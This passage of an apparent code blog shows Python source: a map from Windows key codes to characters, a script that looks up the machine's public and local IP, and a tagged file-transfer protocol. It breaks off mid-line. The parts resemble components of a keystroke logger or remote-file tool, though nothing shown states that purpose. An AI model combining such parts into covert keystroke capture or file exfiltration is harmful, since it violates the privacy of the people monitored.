class="line">    VK_F9:               <span class="string">&#x27;F9&#x27;</span>,</span><br><span class="line">    VK_F10:              <span class="string">&#x27;F10&#x27;</span>,</span><br><span class="line">    VK_F11:              <span class="string">&#x27;F11&#x27;</span>,</span><br><span class="line">    VK_F12:              <span class="string">&#x27;F12&#x27;</span>,</span><br><span class="line">    VK_F13:              <span class="string">&#x27;F13&#x27;</span>,</span><br><span class="line">    VK_F14:              <span class="string">&#x27;F14&#x27;</span>,</span><br><span class="line">    VK_F15:              <span class="string">&#x27;F15&#x27;</span>,</span><br><span class="line">    VK_F16:              <span class="string">&#x27;F16&#x27;</span>,</span><br><span class="line">    VK_F17:              <span class="string">&#x27;F17&#x27;</span>,</span><br><span class="line">    VK_F18:              <span class="string">&#x27;F18&#x27;</span>,</span><br><span class="line">    VK_F19:              <span class="string">&#x27;F19&#x27;</span>,</span><br><span class="line">    VK_F20:              <span class="string">&#x27;F20&#x27;</span>,</span><br><span class="line">    VK_F21:              <span class="string">&#x27;F21&#x27;</span>,</span><br><span class="line">    VK_F22:              <span class="string">&#x27;F22&#x27;</span>,</span><br><span class="line">    VK_F23:              <span class="string">&#x27;F23&#x27;</span>,</span><br><span class="line">    VK_F24:              <span class="string">&#x27;F24&#x27;</span>,</span><br><span class="line">    VK_NUMLOCK:          <span class="string">&#x27;NumLock&#x27;</span>,</span><br><span class="line">    VK_SCROLL:           <span class="string">&#x27;Scroll&#x27;</span>,</span><br><span class="line">    VK_OEM_1:            <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    VK_OEM_PLUS:         <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line">    VK_OEM_COMMA:        <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    VK_OEM_MINUS:        <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    VK_OEM_PERIOD:       <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    VK_OEM_2:            <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    VK_OEM_3:            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line">    VK_OEM_4:            <span class="string">&#x27;[&#x27;</span>,</span><br><span class="line">    VK_OEM_5:            <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    VK_OEM_6:            <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    VK_OEM_7:            <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-0&#x27;</span>:           <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-1&#x27;</span>:           <span class="string">&#x27;!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-2&#x27;</span>:           <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-3&#x27;</span>:           <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-4&#x27;</span>:           <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-5&#x27;</span>:           <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-6&#x27;</span>:           <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-7&#x27;</span>:           <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-8&#x27;</span>:           <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-9&#x27;</span>:           <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-a&#x27;</span>:           <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-b&#x27;</span>:           <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-c&#x27;</span>:           <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-d&#x27;</span>:           <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-e&#x27;</span>:           <span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-f&#x27;</span>:           <span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-g&#x27;</span>:           <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-h&#x27;</span>:           <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-i&#x27;</span>:           <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-j&#x27;</span>:           <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-k&#x27;</span>:           <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-l&#x27;</span>:           <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-m&#x27;</span>:           <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-n&#x27;</span>:           <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-o&#x27;</span>:           <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-p&#x27;</span>:           <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-q&#x27;</span>:           <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-r&#x27;</span>:           <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-s&#x27;</span>:           <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-t&#x27;</span>:           <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-u&#x27;</span>:           <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-v&#x27;</span>:           <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-w&#x27;</span>:           <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-x&#x27;</span>:           <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-y&#x27;</span>:           <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-z&#x27;</span>:           <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Ins&#x27;</span>:       <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-End&#x27;</span>:       <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Down&#x27;</span>:      <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-PageDown&#x27;</span>:  <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Left&#x27;</span>:      <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-NumPad5&#x27;</span>:   <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Right&#x27;</span>:     <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Home&#x27;</span>:      <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Up&#x27;</span>:        <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-PageUp&#x27;</span>:    <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-*&#x27;</span>:         <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-+&#x27;</span>:         <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock--&#x27;</span>:         <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-Del&#x27;</span>:       <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NumLock-/&#x27;</span>:         <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-;&#x27;</span>:           <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-=&#x27;</span>:           <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-,&#x27;</span>:           <span class="string">&#x27;&lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift--&#x27;</span>:           <span class="string">&#x27;_&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-.&#x27;</span>:           <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-/&#x27;</span>:           <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-`&#x27;</span>:           <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-[&#x27;</span>:           <span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-\\&#x27;</span>:          <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-]&#x27;</span>:           <span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Shift-\&#x27;&#x27;</span>:          <span class="string">&#x27;\&quot;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="myip-py"><a href="#myip-py" class="headerlink" title="myip.py"></a>myip.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myip_wan</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://bot.whatismyipaddress.com&#x27;</span></span><br><span class="line">    ip  = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(url) <span class="keyword">as</span> fp:</span><br><span class="line">        ip  = fp.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(ip, <span class="built_in">bytes</span>):</span><br><span class="line">            ip = ip.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myip_lan</span>():</span></span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    s.connect((<span class="string">&quot;8.8.8.8&quot;</span>, <span class="number">53</span>))</span><br><span class="line">    ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = myip_wan()</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br><span class="line">    ip = myip_lan()</span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="netapi-py"><a href="#netapi-py" class="headerlink" title="netapi.py"></a>netapi.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> inout  <span class="keyword">import</span> InitIO, InOutException</span><br><span class="line"><span class="keyword">from</span> path   <span class="keyword">import</span> split_path</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">FILE_BEGIN_TAG   = <span class="string">b&#x27;FILEBEG0&#x27;</span></span><br><span class="line">FILE_END_TAG     = <span class="string">b&#x27;FILEEND0&#x27;</span></span><br><span class="line">FILE_SIZE_TAG    = <span class="string">b&#x27;FILESIZE&#x27;</span></span><br><span class="line">FILE_NAME_TAG    = <span class="string">b&#x27;FILENAME&#x27;</span></span><br><span class="line">FILE_CONTENT_TAG = <span class="string">b&#x27;FILEDATA&#x27;</span></span><br><span class="line">FILE_BLOCKS_TAG  = <span class="string">b&#x27;FILEBLKS&#x27;</span></span><br><span class="line">FILE_SUCCESS_TAG = <span class="string">b&#x27;FILEGOOD&#x27;</span></span><br><span class="line">FILE_FAIL_TAG    = <span class="string">b&#x27;FILEFAIL&#x27;</span></span><br><span class="line">FILE_ABORT_TAG   = <span class="string">b&#x27;FILEABRT&#x27;</span></span><br><span class="line">FILE_TAG_SIZE    = <span class="built_in">len</span>(FILE_BEGIN_TAG)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetAPI</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, iHandle=<span class="literal">None</span>, oHandle=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> iHandle:</span><br><span class="line">            iHandle    = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oHandle:</span><br><span class="line">            oHandle    = iHandle</span><br><span class="line">        self.iHandle   = InitIO(iHandle)</span><br><span class="line">        self.oHandle   = InitIO(oHandle)</span><br><span class="line">        self.savePath  = <span class="string">&#x27;SavedFiles&#x27;</span></span><br><span class="line">        self.maxSize   = <span class="number">2147483647</span></span><br><span class="line">        self.blockSize = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_data</span>(<span class="params">self</span>):</span>          <span class="keyword">return</span> self.iHandle.read()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_tag</span>(<span class="params">self, tag</span>):</span>      self.oHandle.write(tag, <span class="literal">True</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span>(<span class="params">self, data</span>):</span>    self.oHandle.write(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_file</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        fileName = os.path.abspath(path)</span><br><span class="line">        fileSize = os.path.getsize(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;test for %s&#x27;</span>, fileName)</span><br><span class="line">            <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>)     <span class="comment"># test if the file is accessible</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;Exception while testing opening: %s %s&#x27;</span>, fileName, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> fileSize &gt; self.blockSize:</span><br><span class="line">            fileTag, fileSend = (FILE_BLOCKS_TAG,  <span class="keyword">lambda</span>: self.send_blocks(path),)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fileTag, fileSend = (FILE_CONTENT_TAG, <span class="keyword">lambda</span>: self.send_content(path),)</span><br><span class="line">        fileInfo = [</span><br><span class="line">            (FILE_BEGIN_TAG,   <span class="literal">None</span>),</span><br><span class="line">            (FILE_NAME_TAG,    <span class="keyword">lambda</span>: self.send_name(fileName),),</span><br><span class="line">            (FILE_SIZE_TAG,    <span class="keyword">lambda</span>: self.send_size(fileSize),),</span><br><span class="line">            (fileTag,          fileSend,),</span><br><span class="line">            (FILE_END_TAG,     <span class="literal">None</span>,),</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> tag, sendAction <span class="keyword">in</span> fileInfo:</span><br><span class="line">            backTag = <span class="literal">None</span></span><br><span class="line">            error = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.send_tag(tag)</span><br><span class="line">                logging.debug(<span class="string">&#x27;waiting for response after send tag %s&#x27;</span>, tag)</span><br><span class="line">                self.recv_data()</span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                logging.info(<span class="string">&#x27;get tag %s&#x27;</span>, e.args[<span class="number">0</span>])</span><br><span class="line">                backTag = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception when send tag: %s %s&#x27;</span>, tag, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception when send: %s %s&#x27;</span>, tag, <span class="built_in">str</span>(e))</span><br><span class="line">                error = FILE_ABORT_TAG</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> error:</span><br><span class="line">                self.send_tag(error)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            error = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> sendAction: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                sendAction()</span><br><span class="line">                logging.debug(<span class="string">&#x27;wait for response after action&#x27;</span>)</span><br><span class="line">                self.recv_data()</span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                logging.info(<span class="string">&#x27;Exception when send action: %s %s&#x27;</span>, tag, e.args[<span class="number">0</span>])</span><br><span class="line">                backTag = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                error = FILE_ABORT_TAG</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> error:</span><br><span class="line">                self.send_tag(error)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> backTag != FILE_SUCCESS_TAG:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_content</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        logging.debug(<span class="string">&#x27;send content %s&#x27;</span>, fileName)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            filedata = <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">            self.send_data(filedata)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;send_content.Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(filedata)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_success</span>(<span class="params">self</span>):</span>       self.send_tag(FILE_SUCCESS_TAG)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_fail</span>(<span class="params">self</span>):</span>          self.send_tag(FILE_FAIL_TAG)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_abort</span>(<span class="params">self</span>):</span>         self.send_tag(FILE_ABORT_TAG)</span><br><span class="line">    <span class="comment"># receive</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_file</span>(<span class="params">self</span>):</span></span><br><span class="line">        receiver = &#123;</span><br><span class="line">            FILE_NAME_TAG:    self.recv_name,</span><br><span class="line">            FILE_SIZE_TAG:    self.recv_size,</span><br><span class="line">            FILE_CONTENT_TAG: self.recv_content,</span><br><span class="line">            FILE_BLOCKS_TAG:  self.recv_blocks,</span><br><span class="line">        &#125;</span><br><span class="line">        result  = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            tag = <span class="literal">None</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;wait for tag&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data        =  self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                tag         = e.args[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;get tag: %s&#x27;</span>, tag)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> tag: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_BEGIN_TAG:</span><br><span class="line">                result = &#123;&#125;</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after get tag&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_END_TAG:</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after get tag&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> tag == FILE_ABORT_TAG:</span><br><span class="line">                logging.debug(<span class="string">&#x27;abort&#x27;</span>)</span><br><span class="line">                result = &#123;&#125;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            self.send_success()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logging.debug(<span class="string">&#x27;wait for receive data&#x27;</span>)</span><br><span class="line">                data = receiver.get(tag, (<span class="keyword">lambda</span> : <span class="literal">None</span>))()</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">                result[tag] = data</span><br><span class="line">                logging.debug(<span class="string">&#x27;send success after receive data&#x27;</span>)</span><br><span class="line">                self.send_success()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">                tag         = e.args[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> tag: <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;send fail after data&#x27;</span>)</span><br><span class="line">            self.send_fail()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            result = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_verify</span>(<span class="params">self, result</span>):</span></span><br><span class="line">        essential_flag = &#123;FILE_NAME_TAG:<span class="number">1</span>,    FILE_SIZE_TAG:<span class="number">2</span>,</span><br><span class="line">                          FILE_CONTENT_TAG:<span class="number">4</span>, FILE_BLOCKS_TAG:<span class="number">4</span>&#125;</span><br><span class="line">        flag = <span class="built_in">sum</span>([essential_flag.get(x) <span class="keyword">for</span> x <span class="keyword">in</span> result.keys()])</span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">7</span>: result = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_size</span>(<span class="params">self</span>):</span></span><br><span class="line">        size = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(size, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid size type %s&#x27;</span> % <span class="built_in">type</span>(size))</span><br><span class="line">        logging.debug(<span class="string">&#x27;filesize: %s&#x27;</span>, size)</span><br><span class="line">        <span class="keyword">return</span> size</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        path = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid name type %s&#x27;</span> % <span class="built_in">type</span>(path))</span><br><span class="line">        namelist = path.split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> namelist:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;dangerous path&#x27;</span>)</span><br><span class="line">        name = os.path.join(*namelist)</span><br><span class="line">        logging.debug(<span class="string">&#x27;filename: %s&#x27;</span>, name)</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_blocks</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        logging.debug(<span class="string">&#x27;send blocks %s&#x27;</span>, fileName)</span><br><span class="line">        fp        = <span class="built_in">open</span>(fileName, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        blockID   = <span class="number">0</span></span><br><span class="line">        totalSize = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            block      = fp.read(self.blockSize)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> block: <span class="keyword">break</span></span><br><span class="line">            blockID   += <span class="number">1</span></span><br><span class="line">            self.send_data(blockID)</span><br><span class="line">            self.send_data(block)</span><br><span class="line">            totalSize += <span class="built_in">len</span>(block)</span><br><span class="line">            backID     = self.recv_data()</span><br><span class="line">            <span class="keyword">if</span> backID != blockID:</span><br><span class="line">                self.send_fail()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.send_data(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> totalSize</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_size</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.send_data(n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_name</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        fileName = <span class="string">&#x27;\t&#x27;</span>.join(split_path(path))</span><br><span class="line">        <span class="keyword">return</span> self.send_data(fileName)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_content</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.recv_data()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid content type %s&#x27;</span> % <span class="built_in">type</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_blocks</span>(<span class="params">self</span>):</span></span><br><span class="line">        totalSize   = <span class="number">0</span></span><br><span class="line">        lastBlockID = <span class="number">0</span></span><br><span class="line">        fileName = os.path.abspath(os.path.join(self.savePath, <span class="string">&#x27;TEMP%x&#x27;</span> % <span class="built_in">int</span>(time.time())))</span><br><span class="line">        dirname  = os.path.dirname(fileName)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fileName, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                blockID = self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(blockID, <span class="built_in">int</span>):</span><br><span class="line">                    <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid type of block id %s&#x27;</span> % <span class="built_in">type</span>(blockID))</span><br><span class="line">                <span class="keyword">if</span> blockID == <span class="number">0</span>:  <span class="comment"># end of block</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> lastBlockID + <span class="number">1</span> != blockID:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;block ID error last:%d current:%d&#x27;</span> % (lastBlockID, blockID))</span><br><span class="line">                lastBlockID = 